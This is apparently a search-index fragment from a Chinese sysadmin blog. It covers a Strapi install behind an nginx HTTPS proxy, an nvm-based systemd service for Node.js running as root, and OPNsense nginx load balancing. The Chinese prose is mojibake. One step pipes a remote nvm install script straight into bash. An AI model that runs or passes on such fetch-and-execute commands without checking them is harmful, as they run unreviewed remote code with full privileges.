class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport \u003cspan class=\"o\"\u003e{\u003c/span\u003e defineConfig, mergeConfig \u003cspan class=\"o\"\u003e}\u003c/span\u003e from \u003cspan class=\"s1\"\u003e\u0026#39;vite\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e default \u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e mergeConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig, defineConfig\u003cspan class=\"o\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    resolve: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      alias: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;@\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;/src\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      allowedHosts: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äº”å®‰è£…nginxè¿è¡Œç¨‹åº\"\u003eäº”ã€å®‰è£…nginxï¼Œè¿è¡Œç¨‹åº\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ³¨é‡Šæ‰æ— ç”¨é…ç½®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/nginx/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#        include /etc/nginx/sites-enabled/*;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ–°å¢é…ç½®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/nginx/conf.d/strapi.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eupstream strapi \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server 127.0.0.1:1337\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Listen HTTP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen 80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name blog.rendoumi.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Redirect HTTP to HTTPS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"m\"\u003e301\u003c/span\u003e https://\u003cspan class=\"nv\"\u003e$host$request_uri\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Listen HTTPS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen \u003cspan class=\"m\"\u003e443\u003c/span\u003e ssl\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name webcms.yoov.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSL config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate /usr/local/bin/certs/certificates/blog.rendoumi.com.crt\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate_key /usr/local/bin/certs/certificates/blog.rendoumi.com.key\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Proxy Config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass http://strapi\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_http_version 1.1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Server \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Real-IP \u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Proto \u003cspan class=\"nv\"\u003e$scheme\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Host \u003cspan class=\"nv\"\u003e$http_host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Upgrade \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Connection \u003cspan class=\"s2\"\u003e\u0026#34;Upgrade\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass_request_headers on\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data/strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyarn develop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åç™»å½•å°±å¯ä»¥äº†ï¼Œè¯¡å¼‚çš„æ˜¯ç¬¬å››æ­¥ï¼Œå¦‚æœä¸gen vite.config.tsï¼Œé‚£nginxä»£ç†è®¿é—®local host:1337ä¸Šä¼šå‡ºé—®é¢˜ã€‚\u003c/p\u003e","title":"strapiçš„å®‰è£…"},{"content":"æœ‰å¾ˆå¤šnextã€nuxtã€yarnçš„nodejsç¨‹åºï¼Œéƒ½æ˜¯ä»€ä¹ˆnpm startæˆ–è€…yarn developçš„å¯åŠ¨æ¨¡å¼ï¼Œå¦‚ä½•ææˆsystemdçš„æœåŠ¡å‘¢ï¼Œè¿™é‡Œé¢éº»çƒ¦çš„å°±æ˜¯systemdçš„æœåŠ¡éœ€è¦ä½¿ç”¨å…¨è·¯å¾„ã€‚\né‚£æ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…nvm curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash äºŒã€å®‰è£…nodejså’Œyarn source ~/.nvm/nvm.sh nvm ls-remote nvm install v20.19.5 node -v npm install -g yarn npm list -g ä¸‰ã€å¼„strapi.serviceæœåŠ¡ echo $NVM_DIR # ç¡®å®š nvm çš„å®‰è£…ç›®å½• /root/.nvm which node # ç¡®å®š Node.js çš„è·¯å¾„ /root/.nvm/versions/node/v20.19.5/bin/node which yarn # ç¡®å®š Yarn çš„è·¯å¾„ /root/.nvm/versions/node/v20.19.5/bin/yarn cat \u0026lt; EOF \u0026gt; /etc/systemd/system/strapi.service [Unit] Description=Strapi App After=network.target [Service] # ä½¿ç”¨ç”¨æˆ·è´¦æˆ·è¿è¡ŒæœåŠ¡ï¼Œæ›¿æ¢ä¸ºå®é™…çš„ç”¨æˆ·å User=root Group=root # æŒ‡å®šå·¥ä½œç›®å½•ï¼Œæ›¿æ¢ä¸ºé¡¹ç›®çš„å®é™…è·¯å¾„ WorkingDirectory=/data/strapi # åŠ è½½ nvm å¹¶è¿è¡Œ yarn æˆ– node Environment=\u0026#34;NVM_DIR=/root/.nvm\u0026#34; ExecStart=/bin/bash -c \u0026#34;. $NVM_DIR/nvm.sh \u0026amp;\u0026amp; yarn develop\u0026#34; Restart=always RestartSec=10 [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now strapi ","permalink":"https://rendoumi.com/posts/20251015-nodejs_systemctl/","summary":"\u003cp\u003eæœ‰å¾ˆå¤šnextã€nuxtã€yarnçš„nodejsç¨‹åºï¼Œéƒ½æ˜¯ä»€ä¹ˆ\u003ccode\u003enpm start\u003c/code\u003eæˆ–è€…\u003ccode\u003eyarn develop\u003c/code\u003eçš„å¯åŠ¨æ¨¡å¼ï¼Œå¦‚ä½•ææˆsystemdçš„æœåŠ¡å‘¢ï¼Œè¿™é‡Œé¢éº»çƒ¦çš„å°±æ˜¯systemdçš„æœåŠ¡éœ€è¦ä½¿ç”¨å…¨è·¯å¾„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€å®‰è£…nvm\"\u003eä¸€ã€å®‰è£…nvm\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒå®‰è£…nodejså’Œyarn\"\u003eäºŒã€å®‰è£…nodejså’Œyarn\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v20.19.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm list -g\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰å¼„strapiserviceæœåŠ¡\"\u003eä¸‰ã€å¼„strapi.serviceæœåŠ¡\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NVM_DIR\u003c/span\u003e     \u003cspan class=\"c1\"\u003e# ç¡®å®š nvm çš„å®‰è£…ç›®å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhich node        \u003cspan class=\"c1\"\u003e# ç¡®å®š Node.js çš„è·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm/versions/node/v20.19.5/bin/node\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhich yarn        \u003cspan class=\"c1\"\u003e# ç¡®å®š Yarn çš„è·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm/versions/node/v20.19.5/bin/yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026lt; EOF \u0026gt; /etc/systemd/system/strapi.service \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eStrapi App\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä½¿ç”¨ç”¨æˆ·è´¦æˆ·è¿è¡ŒæœåŠ¡ï¼Œæ›¿æ¢ä¸ºå®é™…çš„ç”¨æˆ·å\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGroup\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æŒ‡å®šå·¥ä½œç›®å½•ï¼Œæ›¿æ¢ä¸ºé¡¹ç›®çš„å®é™…è·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWorkingDirectory\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åŠ è½½ nvm å¹¶è¿è¡Œ yarn æˆ– node\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eEnvironment\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;NVM_DIR=/root/.nvm\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/bin/bash -c \u003cspan class=\"s2\"\u003e\u0026#34;. \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NVM_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e/nvm.sh \u0026amp;\u0026amp; yarn develop\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ealways\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestartSec\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now strapi\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"NVMç®¡ç†çš„Nodejså¦‚ä½•åšæˆsystemdçš„serivceæœåŠ¡"},{"content":"æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\né‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\nç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\né‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬ä¸‰ä¸ªï¼ŒNginxçš„åšæ³•\nrelaydå’Œcaddyéƒ½è¯´å®Œäº†ï¼Œé‚£è¿˜æœ‰Nginxï¼ŒNginxçš„è¯ï¼Œå¦‚æœè¯ä¹¦æŒ‚åœ¨OPNsenseï¼Œé‚£å°±å¯ä»¥ç”¨WAFçš„åŠŸèƒ½\nå¦‚æœè¯ä¹¦æ”¾åœ¨åç«¯Kubernetesçš„Nginx ingressä¸Šï¼Œé‚£å°±æ— æ³•ç”¨WAFäº†ï¼Œç®—æ˜¯data stream\né‚£æå‰è¯´ä¸€å¥ï¼ŒNginxçš„é…ç½®æ˜¯æœ‰Bugçš„ï¼Œå¦‚æœæ— æ³•æ¸…é™¤å¹²å‡€ï¼Œéœ€è¦sshç™»å½•opnsenseï¼Œç„¶å\næŠŠ /conf/ä¸‹xmlé…ç½®æ–‡ä»¶ä¸­çš„ nginx éƒ¨åˆ†åˆ é™¤æ‰ï¼Œç„¶åé‡å¯æœåŠ¡å™¨ï¼Œæ‰å¯ä»¥\nos-nginxçš„é…ç½®æ–¹æ³•å¦‚ä¸‹ï¼š\nç¬¬ä¸€æ­¥ï¼šé¦–å…ˆå»Upstreamçš„Upstream Serverå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡å™¨\nç¬¬äºŒæ­¥ï¼šå†å»Upstreamçš„Upstreamå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡\nå»ºç«‹çš„æ—¶å€™advanced modeè¦æ‰“å¼€ï¼ŒPROXY Protocolè¦é€‰ä¸­ï¼ŒServeré€‰ä¸­å„è‡ªçš„4ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®ƒä¿æŒç¼ºçœå³å¯ã€‚\nç¬¬ä¸‰æ­¥ï¼šå»Data Streamsçš„å­æ ‡ç­¾Stream Serversï¼Œå»ºä¸¤ç»„æœåŠ¡\nç¼–è¾‘ä¸€ä¸‹ï¼Œç›‘å¬ç«¯å£åªé€‰æŒ‡å®šIPçš„80å’Œ443ï¼ŒPROXY 